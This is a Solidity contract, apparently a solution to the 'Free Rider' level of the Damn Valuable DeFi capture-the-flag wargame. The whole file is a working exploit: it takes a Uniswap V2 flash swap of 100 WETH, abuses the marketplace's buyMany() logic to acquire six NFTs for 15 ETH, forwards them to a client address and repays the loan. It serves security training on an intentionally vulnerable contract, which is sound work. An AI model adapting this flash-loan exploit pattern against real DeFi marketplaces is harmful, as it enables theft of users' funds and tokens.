// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import { FreeRiderNFTMarketplace } from "./FreeRiderNFTMarketplace.sol";
import { DamnValuableNFT } from "../DamnValuableNFT.sol";

interface WETH {
    function deposit() external payable;

    function withdraw(uint256 wad) external;

    function transfer(address dst, uint256 wad) external returns (bool);
}

contract FRExploit is IERC721Receiver {
    using Address for address payable;

    uint256 constant UINT_MAX = 2**256 - 1;

    IUniswapV2Pair immutable uniswapPair;
    WETH immutable weth;
    FreeRiderNFTMarketplace immutable market;
    DamnValuableNFT nft;
    address client;

    receive() external payable {}

    constructor(
        address _uniswapPair,
        address _weth,
        address _market,
        address _nft,
        address _client
    ) public {
        uniswapPair = IUniswapV2Pair(_uniswapPair);
        weth = WETH(_weth);
        market = FreeRiderNFTMarketplace(payable(_market));
        nft = DamnValuableNFT(_nft);
        client = _client;
    }

    function approveTokens(IERC20[] calldata _tokens, address sender) external {
        for (uint256 i = 0; i < _tokens.length; i++) {
            _tokens[i].approve(sender, UINT_MAX);
        }
    }

    function trigger() external {
        bytes memory empty;
        bytes memory callbackData = abi.encodeWithSelector(IUniswapV2Callee.uniswapV2Call.selector, address(uniswapPair), 0, 0, empty);

        // token0 = weth
        // token1 = dvt
        // flash swap to receive 100 ether from pool
        uniswapPair.swap(100 ether, 0, address(this), callbackData);
    }

    // Uniswap V2 flashswap callback
    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external {
        // buy 6 nfts using buyMany()
        uint256[] memory tokenIds = new uint256[](6);
        for (uint256 i = 0; i < tokenIds.length; i++) {
            tokenIds[i] = i;
        }

        weth.withdraw(15 ether);
        market.buyMany{ value: 15 ether }(tokenIds);
        for (uint256 i = 0; i < tokenIds.length; i++) {
            nft.safeTransferFrom(address(this), client, tokenIds[i]);
        }
        weth.deposit{ value: 16 ether }();

        // 1 ETH fee is more than enough
        require(weth.transfer(address(uniswapPair), 101 ether), "Failed to return flash swap to pair");
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}
